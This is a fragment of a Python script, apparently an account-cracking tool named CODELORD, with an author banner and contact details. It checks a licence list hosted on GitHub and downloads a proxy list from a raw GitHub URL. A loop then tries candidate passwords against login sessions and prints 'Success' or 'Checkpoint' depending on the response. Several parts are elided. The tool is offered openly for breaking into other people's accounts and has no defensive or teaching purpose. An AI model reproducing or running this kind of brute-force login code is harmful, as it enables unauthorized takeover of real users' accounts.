...
___logo___ = (f"""{H} 
 ...
 /  _____/|  |__   ____  _______/  |_  __________   ____  
...
{K}[{P}•{K}]{P}——————————————————————————————
{H}[{P}>{H}]{P} AUTHOR➣➣➣➣GHOSTON
{H}[{P}>{H}]{P} WHATSAPP➣➣➣2349138017570
{H}[{P}>{H}]{P} INSTAGRA➣➣➣➣Iam Ghostwizard
{H}[{P}>{H}]{P} GITHUB➣➣➣➣➣Ghostson
{H}[{P}>{H}]{P} VERSION➣➣➣➣➣40.0
{H}[{P}>{H}]{P} TOOLNAME➣➣➣➣CODELORD
{K}[{P}•{K}]{P}——————————————————————————————
""")
def xoshnaw(): 
  ...
  try: 
    httpCaht = requests.get("https://github.com/Biloboy1/CODELORD/blob/main/ACTIVEID.txt").text 
    if id in httpCaht: 
...
def ___proxy___():
    try:
        ...
        ___roz = requests.get('https://raw.githubusercontent.com/Biloboy/CODELORD/main/Data/proxy.txt').text
        open('Data/proxy.txt', 'w').write(___roz)
    ___crack___()
# Crack
class ___crack___:
            ...
            for pw in pwx:
                ...
                with requests.Session() as ses:
                    ...
                    if 'userId' in str(response):
                        ...
                        print(f"\r{B}[{P}✔{B}]{P} Status :{H} Ghostson Success     ")
                        ...
                        print(f"\r{B}[{P}✘{B}]{P} Status :{K} Ghostson Checkpoint    ")
